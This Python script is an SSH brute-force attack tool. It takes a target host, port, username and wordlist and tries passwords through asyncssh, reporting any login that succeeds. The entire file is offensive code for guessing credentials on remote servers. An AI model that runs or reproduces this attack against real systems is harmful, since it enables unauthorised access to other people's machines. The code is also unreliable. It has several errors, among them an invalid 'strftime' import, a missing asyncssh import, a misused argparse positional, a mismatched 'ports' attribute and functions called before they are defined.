import argparse
from termcolor import colored, cprint
from datetime import datetime, strftime
import asyncio
from os import path
 


#adding command line arguemnt
def get_args():
    """Function to get command-line arguments"""
    parser = argparse.ArgumentParser(description="Command-line argument parser for bruteforce attack script")
    parser.add_argument("target", help="Host to attack on e.g 10.10.10.10")
    parser.add_argument("-p", "--port", dest="port", default="22", required=False, help="Port to attack on (default is: 22)")
    parser.add_argument("-w", "--wordlist", dest="wordlist", required=True, type=str, help="Path to wordlist (/path/to/wordlist.txt)")
    parser.add_argument("username", dest="username", required=True, help="Username with which to bruteforce to")
    arguments = parser.parse_args()

    return arguments


if __name__ == "__main__":
    arguments = get_args()
    if not path.exists(arguments.wordlist):
        print(colored("[-] Wordlist location is not right, \n[-] Provide the right path of the wordlist", 'red'))
        exit(1)
    
    print("\n---------------------------------------------\n----------------------------------")
    print(colored(f"[*] Target\t:", 'light_red',), end="")
    print(arguments.target)
    print((f"[*] Username\t:" "ligth_red",), end="")
    print(arguments.username)


    print(colored(f"[*] Ports\t:", "light_red",),end="")
    print("22" if not arguments.ports else arguments.ports)

    print(colored(f"[*] Wordlist\t:", "light_red",), end="")
    print(arguments.wordlist)

    print(colored(f"[*] Protocol\t:", "light_red",), end="")
    print("SSH")


    print("--------------------------------\n------------------------",)

    print(f"SSH Bruteforce starting at {datetime.now(),strftime('%d-%m-%Y %H:%M:%S')}", 'yellow')

    print("---------------------------------------------\n----------------------------------")

    asyncio.run(main(arguments.target, arguments.port, arguments.username, arguments.wordlist))



async def main(hostname, port, username, wordlist):
    tasks = []

    passwords = []

    found_flag = asyncio.Event()

    concurrency_limit = 10

    counter = 0
    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password  = password.strip()
            passwords.append(password)

        
        for password in passwords:
            if counter >= concurrency_limit:
                await asyncio.wait(tasks,  return_when=asyncio.FIRST_COMPLETED)
                tasks = []

                counter = 0
                if not found_flag.set():
                    tasks.append(asyncio.create_task(ssh_bruteforce(hostname, username, password, port, found_flag)))

            await asyncio.sleep(0.5) #change value according to server.

            counter += 1

    async def ssh_bruteforce(hostname, username, password, port, found_flag):
        try:
            async with asyncssh.connect(host=hostname, username=username, password=password) as conn:
                found_flag.set()

                print(colored(f"[{port}] [ssh] host: {hostname} password: {password}", "green"))
        except Exception as err:
            print(f"[Attempt] target: {hostname} - login: {username} - password: {password}")





